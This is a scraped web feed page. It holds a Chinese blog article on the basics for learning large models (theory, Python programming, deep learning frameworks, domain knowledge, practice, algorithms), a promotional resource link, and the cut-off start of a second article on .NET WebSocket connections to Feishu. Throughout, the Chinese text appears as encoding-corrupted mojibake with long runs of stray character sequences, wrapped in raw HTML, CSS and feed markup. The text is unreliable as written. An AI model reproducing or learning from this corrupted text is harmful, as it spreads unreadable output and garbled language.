<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b99401a0446486a816bef662c9fbb63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768034&amp;x-signature=eK7sBYfTE332k%2BHVHwokLvtoTvQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">1ã€ç†è®ºåŸºç¡€</h3>
<p>ç†è®ºåŸºç¡€æ˜¯ä¸€åˆ‡æŠ€æœ¯çš„å¼€å§‹ï¼Œå¯¹å­¦ä¹ ä¸€é—¨æŠ€æœ¯æ¥è¯´è‡³å…³é‡è¦ï¼Œæ²¡æœ‰ç†è®ºå°±æ— æ³•æŒ‡å¯¼æŠ€æœ¯çš„å‘å±•æ–¹å‘å’Œå®ç°æ–¹æ³•ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>ä»€ä¹ˆæ˜¯ç†è®ºï¼Ÿç†è®ºå…¶å®å°±æ˜¯ä¸€å¥—æè¿°å’Œè§£å†³é—®é¢˜çš„æ–¹æ³•è®ºï¼Œåªä¸è¿‡ä¸åŒçš„æŠ€æœ¯æœ‰ä¸åŒçš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç†è®ºã€‚â€â€â€â€â€â€â€â€â€â€</p>
<p>ç†è®ºçš„å‘å±•æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºå®è·µæ£€éªŒç»“æœæ€»ç»“å‡ºæ¥çš„ç»éªŒï¼›äºŒç§æ˜¯ä»¥ä¸¥è°¨çš„ç§‘å­¦ç†è®ºæ¨å¯¼å‡ºé€»è¾‘è‡ªæ´½çš„è§£å†³æŸä¸ªé—®é¢˜çš„æ–¹æ³•ã€‚â€â€â€â€â€â€â€æ¯”å¦‚è¯´ï¼Œç«æ˜¯äººç±»ç”Ÿå­˜å’Œè¿›åŒ–çš„é‡è¦æ¡ä»¶ä¹‹ä¸€ï¼Œè€Œåœ¨è¿œå¤æ—¶æœŸäººç±»å¯¹äºç«çš„è®¤çŸ¥è¿˜æ¯”è¾ƒæµ…æ˜¾ï¼Œå› æ­¤é‚£æ—¶å…³äºç«çš„ç†è®ºä¹Ÿæ¯”è¾ƒåŸºç¡€ï¼Œæ¯”å¦‚å®ƒå¯ä»¥å–æš–ï¼Œå¯ä»¥çƒ¤ç†Ÿé£Ÿç‰©ç­‰ï¼›è¿™å°±æ˜¯åŸºäºç»éªŒçš„ç†è®ºåŸºç¡€ã€‚â€â€â€â€</p>
<p>è€Œéšç€ç§‘å­¦æŠ€æœ¯çš„å‘å±•ï¼Œäººç±»å¯¹äºç«çš„ç ”ç©¶æ›´åŠ çš„æ·±å…¥ï¼Œæ¯”å¦‚ç«çš„å½¢æ€ï¼Œç«æœ¬æ— å½¢ï¼Œä½†åˆæ˜¯æµä½“ï¼Œè€Œè¿™å°±æ˜¯åŸºäºä¸¥è°¨çš„ç§‘å­¦ç ”ç©¶å’Œç†è®ºæ¨å¯¼çš„ç»“æœã€‚â€â€é‚£å­¦ä¹ å¤§æ¨¡å‹éœ€è¦å“ªäº›ç†è®ºï¼Ÿ</p>
<p>åŸºç¡€ç†è®ºæœ‰ï¼Œäººå·¥æ™ºèƒ½çš„æ¦‚å¿µï¼Œæœºå™¨å­¦ä¹ ï¼Œæ·±åº¦å­¦ä¹ ï¼Œç¥ç»ç½‘ç»œåŸç†ï¼Œæ¿€æ´»å‡½æ•°ï¼ŒæŸå¤±å‡½æ•°ï¼Œæ­£å‘ä¼ æ’­ï¼Œåå‘ä¼ æ’­ç­‰åŸºç¡€ç†è®ºï¼Œå¯¹è¿™äº›åŸºç¡€ç†è®ºç­‰ç†è§£æ˜¯éå¸¸å¿…è¦çš„ã€‚â€â€â€â€â€â€â€æœ‰äº†ç†è®ºä¹‹åå°±èƒ½è®©ä½ çŸ¥é“å¤§æ¨¡å‹èƒ½å¹²å•¥ï¼Œä»¥åŠæ€ä¹ˆå¹²ã€‚â€â€</p>
<h3 data-id="heading-2">2ã€ç¼–ç¨‹åŸºç¡€</h3>
<p>ç¼–ç¨‹åŸºç¡€å°±ä¸ç”¨å¤šè¯´äº†ï¼Œæ‰€æœ‰çš„è®¡ç®—æœºè½¯ä»¶éƒ½æ˜¯åŸºäºç¼–ç¨‹æŠ€æœ¯å¼€å‘çš„ï¼Œå¤§æ¨¡å‹ä¹Ÿä¸ä¾‹å¤–ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€ä½†éœ€è¦è¯´çš„æ˜¯ï¼Œå¤§æ¨¡å‹å¼€å‘ä¸»è¦ä½¿ç”¨çš„æ˜¯Pythonä½œä¸ºå…¶ä¸»æµçš„å¼€å‘è¯­è¨€ï¼Œå½“ç„¶å¹¶ä¸æ˜¯è¯´å¼€å‘å¤§æ¨¡å‹å¿…é¡»ç”¨pythonï¼Œç”¨å…¶å®ƒè¯­è¨€ä¹Ÿå¯ä»¥ï¼Œæ¯•ç«Ÿè¯­è¨€åªæ˜¯å·¥å…·ï¼Œç®—æ³•æ‰æ˜¯æ ¸å¿ƒï¼›è€Œç®—æ³•æ˜¯è„±ç¦»è®¡ç®—æœºè¯­è¨€ç‹¬ç«‹å­˜åœ¨çš„ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>è¿˜æœ‰å°±æ˜¯ï¼Œå¤§æ¨¡å‹æœ¬èº«æ˜¯ä¸»è¦åŸºäºPythonå¼€å‘çš„ï¼Œä½†åŸºäºå¤§æ¨¡å‹æ„å»ºä¸Šå±‚åº”ç”¨å¯ä»¥ä½¿ç”¨å…¶å®ƒå·¥ç¨‹æ€§è¯­è¨€ï¼Œæ¯”å¦‚Javaï¼ŒGoï¼ŒRustç­‰ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨Pythonã€‚â€â€â€â€â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4641b097341e401596b21488bc6ef4b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768034&amp;x-signature=fF2yft6HSAXmO7oAXKcV3QvrFWw%3D" alt="" loading="lazy"/></p>
<p>å¤§æ¨¡å‹ä½œä¸ºä¸€ä¸ªæœåŠ¡ï¼Œä¸€èˆ¬ç”±Pythonå¼€å‘ï¼Œç„¶åå°è£…æˆå¯¹å¤–æ¥å£ï¼Œç„¶åä½¿ç”¨å…¶å®ƒå¼€å‘è¯­è¨€è°ƒç”¨æ„å»ºä¸Šå±‚åº”ç”¨ã€‚â€â€</p>
<h3 data-id="heading-3">3ã€æ·±åº¦å­¦ä¹ æ¡†æ¶</h3>
<p>ä»€ä¹ˆæ˜¯æ¡†æ¶ï¼Ÿâ€</p>
<p>æ¡†æ¶å°±ç±»ä¼¼äºæ¨¡å…·ï¼Œå¤§æ¨¡å‹æ˜¯ä¸€ä¸ªéå¸¸å¤æ‚çš„ç³»ç»Ÿæ€§å·¥ç¨‹ï¼Œä»0å¼€å§‹æ„å»ºéš¾åº¦éå¸¸å¤§ï¼Œå› æ­¤å°±æœ‰äº†ä¸€äº›å¼€æºæ¡†æ¶æ¥å¤„ç†ä¸€äº›åŸºç¡€æ€§å·¥ä½œå’Œä¸€äº›å¸¸ç”¨çš„å·¥å…·ã€‚â€â€â€â€â€â€â€â€æ¯”å¦‚è¯´æ•°æ®å¤„ç†ï¼Œåœ¨å¤§æ¨¡å‹æŠ€æœ¯ä¸­æ•°æ®å¤„ç†æ˜¯éå¸¸é‡è¦çš„ä¸€ç¯ï¼Œä½†é¢å¯¹å¤æ‚çš„æ•°æ®ç§ç±»ä»¥åŠæ•°æ®æ ¼å¼ï¼Œå¦‚æœå…¨éƒ¨è‡ªå·±æ‰‹åŠ¨å¤„ç†å°†æ˜¯ä¸€ä¸ªå·¨å¤§çš„å·¥ç¨‹é‡ï¼›å› æ­¤ä¸ºäº†æé«˜å¼€å‘æ•ˆç‡ï¼Œæ’é™¤è¿™äº›å¤–åœ¨å¹²æ‰°ï¼Œè®©æŠ€æœ¯äººå‘˜æŠŠå¿ƒæ€æ”¾åœ¨å¤§æ¨¡å‹çš„æ ¸å¿ƒèŠ‚ç‚¹ä¸Šï¼Œæ¡†æ¶å°±å‡ºç°äº†ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>è¿˜æœ‰å°±æ˜¯ï¼Œè¿™äº›æ·±åº¦å­¦ä¹ æ¡†æ¶ä¸€èˆ¬ä¼šå†…ç½®ä¸€äº›ç»å…¸æ¶æ„çš„å®ç°ï¼Œæ¯”å¦‚Transformeræ¶æ„ï¼Œå’Œä¸€äº›å¸¸è§çš„ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œæ¯”å¦‚CNNå’ŒRNNï¼Œè¿™æ ·å¯¹ä¸€äº›åˆå­¦è€…å°±å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›å·¥å…·æ„å»ºå±äºè‡ªå·±çš„å¤§æ¨¡å‹ã€‚â€â€â€â€â€â€â€â€â€â€â€å¸¸è§çš„æ·±åº¦å­¦ä¹ æ¡†æ¶ï¼Œå¦‚PyTorchï¼ŒTensorflowç­‰ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-4">4ã€ç‰¹å®šé¢†åŸŸçš„çŸ¥è¯†</h3>
<p>å¤§æ¨¡å‹æ˜¯ä¸€ä¸ªéå¸¸ç¬¼ç»Ÿçš„æŠ€æœ¯ï¼Œä½†ç»†åˆ†ä¸‹å»åˆæœ‰å¤šç§ä¸åŒçš„æ–¹å‘ï¼Œæ¯”å¦‚è¯´è‡ªç„¶è¯­è¨€å¤„ç†ï¼Œè®¡ç®—æœºè§†è§‰ç­‰ã€‚æ¯•ç«Ÿå¤§æ¨¡å‹ä¹Ÿæ˜¯ç”¨æ¥è§£å†³é—®é¢˜çš„ï¼Œå¦‚æœå¤§æ¨¡å‹æ²¡æœ‰å…·ä½“çš„è½è„šç‚¹ï¼Œé‚£ä¹ˆå®ƒå°±æˆä¸ºäº†ä¸€ä¸ªçº¯ç†è®ºæ€§è´¨çš„ç ”ç©¶ï¼Œè¿™æ ·å®ƒå°±å¤±å»äº†åº”æœ‰çš„ä»·å€¼ã€‚â€â€â€</p>
<p>è€Œä¸è®ºæ˜¯è‡ªç„¶è¯­è¨€å¤„ç†ï¼Œè¿˜æ˜¯è®¡ç®—æœºè§†è§‰éƒ½æ˜¯ç‹¬ç«‹çš„åº”ç”¨é¢†åŸŸï¼Œå®ƒä»¬å’Œå¤§æ¨¡å‹çš„å…³ç³»å°±æ˜¯å¤§æ¨¡å‹å¯ä»¥ä½œä¸ºå…¶ç ”ç©¶çš„ä¸€ä¸ªæ–¹æ³•æˆ–æ‰‹æ®µï¼Œæ²¡æœ‰å¤§æ¨¡å‹ä¹Ÿå¯ä»¥ç ”ç©¶è‡ªç„¶è¯­è¨€å¤„ç†å’Œè®¡ç®—æœºè§†è§‰ï¼›ä½†è‡ªç„¶è¯­è¨€å¤„ç†å’Œè®¡ç®—æœºè§†è§‰å¯ä»¥åˆ©ç”¨å¤§æ¨¡å‹è¿›è¡Œæ›´åŠ é«˜æ•ˆçš„ç ”ç©¶ã€‚â€â€â€â€</p>
<p>å› æ­¤ï¼Œå¦‚æœåªæ˜¯å•çº¯çš„å­¦ä¹ å¤§æ¨¡å‹æŠ€æœ¯ï¼Œä¸ä¸è¿™äº›å…·ä½“çš„åº”ç”¨é¢†åŸŸç›¸ç»“åˆï¼Œé‚£ä¹ˆå­¦ä¹ å¤§æ¨¡å‹æŠ€æœ¯å°±å¤±å»äº†åº”æœ‰çš„æ„ä¹‰ã€‚â€â€â€â€â€â€â€è€Œç”¨å¤§æ¨¡å‹å»ç ”ç©¶è¿™äº›åº”ç”¨é¢†åŸŸï¼Œæˆ–è€…è¯´ç”¨å¤§æ¨¡å‹ä½œä¸ºè§£å†³è¿™äº›é¢†åŸŸçš„ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå°±éœ€è¦æœ‰å¯¹åº”é¢†åŸŸçš„åŸºç¡€çŸ¥è¯†ï¼Œåªæœ‰å¤§æ¨¡å‹æœ¬èº«çš„æŠ€æœ¯æ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚â€â€â€â€è‡ªç„¶è¯­è¨€å¤„ç†æ‰€æ¶‰åŠçš„çŸ¥è¯†æœ‰è¯­è¨€åˆ†æï¼Œè¯­ä¹‰åˆ†æï¼Œåˆ†è¯ï¼Œè‡ªç„¶è¯­è¨€ç†è§£ï¼Œè‡ªç„¶è¯­è¨€ç”Ÿæˆç­‰ã€‚â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-5">5ã€å®è·µç»éªŒ</h3>
<p>å®è·µ å®è·µ å†å®è·µï¼Œé‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼ï¼ï¼â€â€â€â€</p>
<p>å¤§æ¨¡å‹æŠ€æœ¯æ˜¯ä¸€é¡¹å®æ“æ€§å¾ˆå¼ºçš„æŠ€æœ¯ï¼Œæˆ–è€…è¯´ä»»ä½•æŠ€æœ¯éƒ½ç¦»ä¸å¼€å®æ“ï¼Œçº¯ç²¹çš„ç†è®ºç ”ç©¶ç»ˆç©¶åªæ˜¯ç©ºä¸­æ¥¼é˜ã€‚â€â€â€â€â€â€</p>
<p>ä»å­¦ä¹ æ–¹æ³•çš„è§’åº¦æ¥è¯´ï¼Œç†è®ºåº”è¯¥ä¸å®è·µç›¸ç»“åˆï¼Œå¾ˆå¤šäººåœ¨å­¦ä¹ ç†è®ºçš„è¿‡ç¨‹ä¸­æ€»å–œæ¬¢æ‰“ç ´ç ‚é”…é—®åˆ°åº•ï¼Œé’»è¿›ç†è®ºä¸­å‡ºä¸æ¥ã€‚â€â€â€â€â€â€â€å½“ç„¶ï¼Œå¹¶ä¸æ˜¯è¯´æ‰“ç ´ç ‚é”…é—®åˆ°åº•ä¸å¥½ï¼Œä½œä¸ºæŠ€æœ¯ç ”ç©¶äººå‘˜æœ‰å¿…é¡»è¦æœ‰æ‰“ç ´ç ‚é”…é—®åˆ°åº•çš„å†³å¿ƒã€‚â€â€</p>
<p>ä½†æ˜¯ï¼Œç†è®ºä¸€æ–¹é¢æ˜¯ç”±ä¸¥è°¨çš„ç§‘å­¦é€»è¾‘æ¨å¯¼å‡ºæ¥çš„ï¼Œè¿˜ä¸€éƒ¨åˆ†æ˜¯æ ¹æ®å®è·µæ€»ç»“å’Œè°ƒæ•´çš„ï¼›å•çº¯çš„ç ”ç©¶ç†è®ºå¾ˆéš¾è®©ä½ çœŸæ­£ç†è§£æŠ€æœ¯çš„æœ¬è´¨ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæœ‰äº›é—®é¢˜åœ¨å­¦ä¹ çš„æ—¶å€™æ€ä¹ˆéƒ½æƒ³ä¸æ˜ç™½ï¼Œä½†ç­‰çœŸæ­£å»å®æ“çš„æ—¶å€™çªç„¶ä¹‹é—´å°±è±ç„¶å¼€æœ—ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>æœ€å¥½çš„å­¦ä¹ æ–¹å¼å°±æ˜¯ï¼Œåœ¨äº†è§£ä¸€äº›ç†è®ºçš„åŸºæœ¬æ¦‚å¿µä¹‹åï¼Œå°±ä¸Šæ‰‹æ‰¾ä¸ªå¤§æ¨¡å‹è¿›è¡Œå®æ“ï¼›ç„¶åç”¨å®æ“å»éªŒè¯ç†è®ºï¼Œè¿™æ ·æ‰èƒ½æ˜ç™½åˆ«äººä¸ºä»€ä¹ˆä¼šè¿™æ ·è®¾è®¡ï¼Œä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·åšï¼Œä¸å¯ä»¥é‚£æ ·åšã€‚â€â€â€â€â€â€â€â€â€â€â€é’»è¿›ç†è®ºå‡ºä¸æ¥ï¼Œå¹¶ä¸”ä¸è‚¯åŠ¨æ‰‹å®è·µçš„äººï¼Œå°±æ˜¯é‚£ç§ç»å¸¸é’»ç‰›è§’å°–çš„ï¼Œç†è®ºä¸€å¥—ä¸€å¥—çš„ï¼Œä½†å•¥éƒ½å¹²ä¸å¥½ï¼›è€Œä¸”æœ€é‡è¦çš„æ˜¯ï¼Œè¿™ç§é’»ç‰›è§’å°–çš„æ–¹å¼å¾€å¾€ä¼šäº‹åŠåŠŸå€ï¼Œå¯¼è‡´åŠé€”è€ŒåºŸã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-6">6ã€ç®—æ³•åŸºç¡€</h3>
<p>ç®—æ³•çš„é‡è¦æ€§å°±ä¸ç”¨å¤šè¯´äº†ï¼Œä»»ä½•å’Œè®¡ç®—æœºæœ‰å…³çš„ä¸œè¥¿éƒ½ç¦»ä¸å¼€ç®—æ³•ï¼Œå¦‚æœè¯´ç¡¬ä»¶æ˜¯è®¡ç®—æœºçš„èº«ä½“ï¼Œé‚£ä¹ˆç®—æ³•å°±æ˜¯è®¡ç®—æœºçš„çµé­‚ã€‚â€â€â€å¤§æ¨¡å‹å¯ä»¥è¯´æ˜¯ç®—æ³•çš„é›†å¤§æˆè€…ï¼Œå› ä¸ºå¤§æ¨¡å‹æ˜¯åŸºäºä¸¥è°¨çš„æ•°å­¦ç†è®ºæ¨å¯¼çš„ï¼Œè€Œç®—æ³•æ˜¯æ•°å­¦åœ¨è®¡ç®—æœºä¸­çš„è½½ä½“ï¼Œç¦»å¼€äº†ç®—æ³•å¤§æ¨¡å‹å°†ä¸å¤å­˜åœ¨ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>ä»¥ä¸Šå°±æ˜¯ä¸€äº›å­¦ä¹ å¤§æ¨¡å‹æŠ€æœ¯æ‰€éœ€è¦çš„åŸºç¡€ï¼Œä½†å¹¶ä¸æ˜¯å…¨éƒ¨ï¼›å¤§æ¨¡å‹æŠ€æœ¯æ˜¯äººå·¥æ™ºèƒ½æŠ€æœ¯çš„ä¸€ç§å®ç°æ–¹å¼ï¼Œè€Œäººå·¥æ™ºèƒ½æŠ€æœ¯æ˜¯ä¸€ä¸ªå¤šå­¦ç§‘äº¤å‰çš„ç§‘å­¦ï¼Œæ¶‰åŠåˆ°æ•°å­¦ï¼Œç¤¾ä¼šå­¦ï¼Œå“²å­¦ï¼Œè®¡ç®—æœºç§‘å­¦ï¼Œå·¥ç¨‹å­¦ï¼Œæ§åˆ¶è®ºç­‰ç­‰ï¼Œç”šè‡³åŒ…æ‹¬æ–‡å­¦ä¸è‰ºæœ¯ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>å› æ­¤ï¼Œè¦æƒ³å­¦å¥½å¤§æ¨¡å‹ï¼ŒæŠ€æœ¯åªæ˜¯æœ€åŸºç¡€çš„ä¸œè¥¿ã€‚ä¸‡ä¸ˆé«˜æ¥¼å¹³åœ°èµ·ï¼Œå…¨é æœ‰ä¸ªå¥½åœ°åŸºã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-7">å­¦ä¹ èµ„æºæ¨è</h3>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€åˆ†é’Ÿå®ç°.NETä¸é£ä¹¦é•¿è¿æ¥çš„WebSocketæ¶æ„]]></title>    <link>https://juejin.cn/post/7580940585692053542</link>    <guid>https://juejin.cn/post/7580940585692053542</guid>    <pubDate>2025-12-08T03:03:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580940585692053542" data-draft-id="7580564126403346482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€åˆ†é’Ÿå®ç°.NETä¸é£ä¹¦é•¿è¿æ¥çš„WebSocketæ¶æ„"/> <meta itemprop="keywords" content="åç«¯,.NET,C#"/> <meta itemprop="datePublished" content="2025-12-08T03:03:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mudtools"/> <meta itemprop="url" content="https://juejin.cn/user/2112621078650964"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€åˆ†é’Ÿå®ç°.NETä¸é£ä¹¦é•¿è¿æ¥çš„WebSocketæ¶æ„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2112621078650964/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mudtools
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:03:23.000Z" title="Mon Dec 08 2025 03:03:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>é£ä¹¦æœåŠ¡ç«¯SDKå·²å…¨é¢æ”¯æŒJavaã€Goã€Pythonä¸Node.jsç­‰ä¸»æµå¼€å‘è¯­è¨€ï¼Œç„¶è€Œ.NETç”Ÿæ€ç³»ç»Ÿçš„å¼€å‘è€…ä»¬å´é¢ä¸´ç€å®˜æ–¹SDKç¼ºå¤±çš„å›°å¢ƒï¼Œè¿™æ— ç–‘ä¸º.NETç¤¾åŒºæ¥å…¥é£ä¹¦å¹³å°å¸¦æ¥äº†ä¸ä¾¿ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€.netä¸­å¦‚ä½•å®ç°é£ä¹¦WebSocketé•¿è¿æ¥</h2>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆé€‰æ‹©é£ä¹¦WebSocketï¼Ÿ</h3>
<p>ç›¸è¾ƒäºä¼ ç»Ÿçš„Webhookæ¨¡å¼ï¼Œé•¿è¿æ¥æ¨¡å¼å¤§å¤§é™ä½äº†æ¥å…¥æˆæœ¬ï¼Œå°†åŸå…ˆ1å‘¨å·¦å³çš„å¼€å‘å‘¨æœŸé™ä½åˆ°5åˆ†é’Ÿã€‚</p>
